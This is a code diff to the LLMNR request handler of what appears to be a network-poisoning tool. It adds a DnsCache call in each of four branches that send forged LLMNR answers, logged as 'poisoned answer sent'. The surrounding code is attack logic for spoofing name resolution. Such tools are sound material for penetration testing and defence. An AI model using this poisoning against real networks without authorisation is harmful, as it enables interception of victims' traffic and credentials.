@@ -1232,6 +1232,7 @@ class LLMNR(BaseRequestHandler):
                             if RespondToIPScope(RespondTo, self.client_address[0]):
                                 if RespondToSpecificName(RespondToName) == False:
                                     buff = LLMNRAns(Tid=data[0:2],QuestionName=Name, AnswerName=Name)
+                                    DnsCache.getInstance().setCustomRes(Name.lower())
                                     buff.calculate()
                                     for x in range(1):
                                         soc.sendto(str(buff), self.client_address)
@@ -1253,6 +1254,7 @@ class LLMNR(BaseRequestHandler):
 
                                 if RespondToSpecificName(RespondToName) and RespondToNameScope(RespondToName.upper(), Name.upper()):
                                     buff = LLMNRAns(Tid=data[0:2],QuestionName=Name, AnswerName=Name)
+                                    DnsCache.getInstance().setCustomRes(Name.lower())
                                     buff.calculate()
                                     for x in range(1):
                                         soc.sendto(str(buff), self.client_address)
@@ -1275,6 +1277,7 @@ class LLMNR(BaseRequestHandler):
                     if Analyze(AnalyzeMode) == False and RespondToSpecificHost(RespondTo) == False:
                         if RespondToSpecificName(RespondToName) and RespondToNameScope(RespondToName.upper(), Name.upper()):
                             buff = LLMNRAns(Tid=data[0:2],QuestionName=Name, AnswerName=Name)
+                            DnsCache.getInstance().setCustomRes(Name.lower())
                             buff.calculate()
                             Message =  "LLMNR poisoned answer sent to this IP: %s. The requested name was : %s."%(self.client_address[0],Name)
                             for x in range(1):
@@ -1294,6 +1297,7 @@ class LLMNR(BaseRequestHandler):
                                     pass
                         if RespondToSpecificName(RespondToName) == False:
                              buff = LLMNRAns(Tid=data[0:2],QuestionName=Name, AnswerName=Name)
+                             DnsCache.getInstance().setCustomRes(Name.lower())
                              buff.calculate()
                              Message =  "LLMNR poisoned answer sent to this IP: %s. The requested name was : %s."%(self.client_address[0],Name)
                              for x in range(1):
